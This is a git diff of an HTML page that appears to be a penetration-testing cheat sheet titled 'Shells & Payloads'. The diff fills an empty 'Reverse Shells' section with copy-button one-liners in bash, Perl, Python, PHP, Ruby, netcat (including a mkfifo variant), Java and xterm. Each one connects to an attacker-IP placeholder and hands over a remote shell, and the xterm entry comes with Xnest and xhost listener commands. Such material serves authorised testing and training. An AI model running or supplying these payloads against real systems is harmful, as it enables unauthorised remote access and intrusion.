@@ -65,11 +65,10 @@
     <a href="pivoting.html">🔀 Pivoting</a>
     <a href="ad-enumeration.html">🧩 AD Enumeration</a>
 
-    <a href="ad-attacks.html">⚔️ AD Attacks</a>
+  <a href="ad-attacks.html">⚔️ AD Attacks I</a>
+    <a href="ad-attacks2.html">⚔️ AD Attacks II</a>
 
-    <a href="ad-lateral-movement.html">🔀 AD Lateral Movement</a>
-
-    <a href="cloud-security.html">☁️ Cloud</a>
+  <a href="ad-lateral-movement.html">🔀 AD Lateral Movement</a>
 
   </nav>
 
@@ -90,82 +89,136 @@
     <!-- TITLE -->
     <div class="section">
       <h1>Shells & Payloads</h1>
-      <p>
-        Getting a shell is not the goal.<br>
-        Keeping it stable and upgrading it is.
-      </p>
+
     </div>
 
-    <!-- SHELL TYPES -->
-    <div class="section">
-      <h2>Bash Reverse Shell</h2>
-    </div>
 
-    <div class="section">
-      <h2>CMD Reverse Shell</h2>
-    </div>
+    <!-- ===================== -->
+<!-- REVERSE SHELLS -->
+<!-- ===================== -->
+<div class="section">
+  <h2>Reverse Shells</h2>
 
-    <div class="section">
-      <h2>Golang Reverse Shell</h2>
-    </div>
+  <!-- BASH -->
+  <p><strong>Bash</strong></p>
+  <pre>
+<code>bash -i >& /dev/tcp/&lt;IP-ATTACKER&gt;/&lt;PORT&gt; 0>&1</code>
+<button class="copy-btn" data-copy="bash -i >& /dev/tcp/<IP-ATTACKER>/<PORT> 0>&1">COPY</button>
+  </pre>
+  
 
-    <div class="section">
-      <h2>Java Reverse Shell</h2>
-    </div>
+  <pre>
+<code>bash -c 'bash -i >& /dev/tcp/&lt;IP-ATTACKER&gt;/&lt;PORT&gt; 0>&1'</code>
+<button
+  class="copy-btn"
+  data-copy="bash -c 'bash -i >& /dev/tcp/<IP-ATTACKER>/<PORT> 0>&1'">COPY</button>
+</pre>
 
-    <div class="section">
-      <h2>Lua Reverse Shell</h2>
-    </div>
+<pre>
+<code>bash -c 'bash -i >%26 /dev/tcp/&lt;IP-ATTACKER&gt;/&lt;PORT&gt; 0>%261'</code>
+<button
+  class="copy-btn"
+  data-copy="bash -c 'bash -i >& /dev/tcp/<IP-ATTACKER>/<PORT> 0>&1'">COPY</button>
+</pre>
 
-    <div class="section">
-      <h2>Netcat Reverse Shell</h2>
-    </div>
+  <!-- PERL -->
+  <p><strong>Perl</strong></p>
+  <pre>
+<code>perl -e 'use Socket;$i="&lt;IP-ATTACKER&gt;";$p=&lt;PORT&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code>
+<button class="copy-btn" data-copy="perl -e 'use Socket;$i=&quot;<IP-ATTACKER>&quot;;$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;>&amp;S&quot;);open(STDOUT,&quot;>&amp;S&quot;);open(STDERR,&quot;>&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'">COPY</button>
+  </pre>
 
-    <div class="section">
-      <h2>Perl Reverse Shell</h2>
-    </div>
+  <!-- PYTHON -->
+  <p><strong>Python</strong></p>
+  <pre>
+<code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;IP-ATTACKER&gt;",&lt;PORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'</code>
+<button class="copy-btn" data-copy="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<IP-ATTACKER>&quot;,<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'">COPY</button>
+  </pre>
 
-    <div class="section">
-      <h2>PowerShell Reverse Shell</h2>
-    </div>
+  <pre class="code-block">
+<code>import socket
+import os
+import pty
 
-    <div class="section">
-      <h2>PHP Reverse Shell</h2>
-    </div>
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("&lt;IP-ATTACKER&gt;", &lt;PORT&gt;))
 
-    <div class="section">
-      <h2>Python Reverse Shell</h2>
-    </div>
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
 
-    <div class="section">
-      <h2>Ruby Reverse Shell</h2>
-    </div>
+pty.spawn("/bin/bash")</code>
+<button class="copy-btn" data-copy="import socket
+import os
+import pty
 
-    <div class="section">
-      <h2>Socat Shell</h2>
-    </div>
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((&lt;IP-ATTACKER&gt;, &lt;PORT&gt;))
 
-    <div class="section">
-      <h2>Telnet Shell</h2>
-    </div>
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
 
-    <div class="section">
-      <h2>Reverse Shell Generators</h2>
-      <ul>
-        <li>Payload generation tools</li>
-        <li>One-liners</li>
-        <li>Web-based generators</li>
-      </ul>
-    </div>
+pty.spawn(&quot;/bin/bash&quot;)">COPY</button>
+</pre>
 
-    <!-- SHELL TREATMENT -->
+  <!-- PHP -->
+  <p><strong>PHP</strong></p>
+  <pre>
+<code>php -r '$sock=fsockopen("&lt;IP-ATTACKER&gt;",&lt;PORT&gt;);exec("/bin/sh -i <&3 >&3 2>&3");'</code>
+<button class="copy-btn" data-copy="php -r '$sock=fsockopen(&quot;<IP-ATTACKER>&quot;,<PORT>);exec(&quot;/bin/sh -i <&3 >&3 2>&3&quot;);'">COPY</button>
+  </pre>
+
+  <!-- RUBY -->
+  <p><strong>Ruby</strong></p>
+  <pre>
+<code>ruby -rsocket -e 'f=TCPSocket.open("&lt;IP-ATTACKER&gt;",&lt;PORT&gt;).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</code>
+<button class="copy-btn" data-copy="ruby -rsocket -e 'f=TCPSocket.open(&quot;<IP-ATTACKER>&quot;,<PORT>).to_i;exec sprintf(&quot;/bin/sh -i <&%d >&%d 2>&%d&quot;,f,f,f)'">COPY</button>
+  </pre>
+
+  <!-- NETCAT -->
+  <p><strong>Netcat (with -e)</strong></p>
+  <pre>
+<code>nc -e /bin/sh &lt;IP-ATTACKER&gt; &lt;PORT&gt;</code>
+<button class="copy-btn" data-copy="nc -e /bin/sh <IP-ATTACKER> <PORT>">COPY</button>
+  </pre>
+
+  <p><strong>Netcat (no -e support)</strong></p>
+  <pre>
+<code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &lt;IP-ATTACKER&gt; &lt;PORT&gt; >/tmp/f</code>
+<button class="copy-btn" data-copy="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP-ATTACKER> <PORT> >/tmp/f">COPY</button>
+  </pre>
+
+  <!-- JAVA -->
+  <p><strong>Java</strong></p>
+  <pre>
+<code>Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/&lt;IP-ATTACKER&gt;/&lt;PORT&gt;;cat <&5 | while read line; do $line 2>&5 >&5; done"});</code>
+<button class="copy-btn" data-copy="Runtime.getRuntime().exec(new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5<>/dev/tcp/<IP-ATTACKER>/<PORT>;cat <&5 | while read line; do $line 2>&5 >&5; done&quot;});">COPY</button>
+  </pre>
+
+  <!-- XTERM -->
+  <p><strong>Xterm Reverse Shell</strong></p>
+  <pre>
+<code>xterm -display &lt;IP-ATTACKER&gt;:&lt;DISPLAY&gt;</code>
+<button class="copy-btn" data-copy="xterm -display <IP-ATTACKER>:<DISPLAY>">COPY</button>
+  </pre>
+
+  <p><strong>Listener (Attacker)</strong></p>
+  <pre>
+<code>Xnest :&lt;DISPLAY&gt;</code>
+<button class="copy-btn" data-copy="Xnest :<DISPLAY>">COPY</button>
+  </pre>
+
+  <pre>
+<code>xhost +&lt;TARGET-IP&gt;</code>
+<button class="copy-btn" data-copy="xhost +<TARGET-IP>">COPY</button>
+  </pre>
+</div>
+
+
     <div class="section">
       <h2>Shell Stabilization</h2>
-      <ul>
-        <li>TTY upgrade</li>
-        <li>Terminal settings</li>
-        <li>Background and foreground control</li>
-      </ul>
+
     </div>
 
     <div class="section">
